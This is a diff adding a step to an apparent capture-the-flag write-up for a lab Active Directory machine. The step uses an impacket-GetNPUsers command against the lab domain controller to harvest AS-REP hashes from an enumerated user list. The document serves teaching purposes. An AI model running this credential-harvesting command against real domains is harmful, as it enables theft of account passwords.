@@ -58,6 +58,12 @@ cat fullinfo.txt | grep SidTypeUser | awk -F'\' '{print $2}' | awk -F'(' '{print
 
 ![users1](/images/users.jpg)
 
+Now, having a list of users, let's try to harvest AS_REP responses to see if we can get a hash. (The IP changed because i had to restart the target machine).
+
+```
+impacket-GetNPUsers 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip 10.10.171.250
+```
+![hash1](/images/hash1.jpg)
 
 ## Exploitation
 
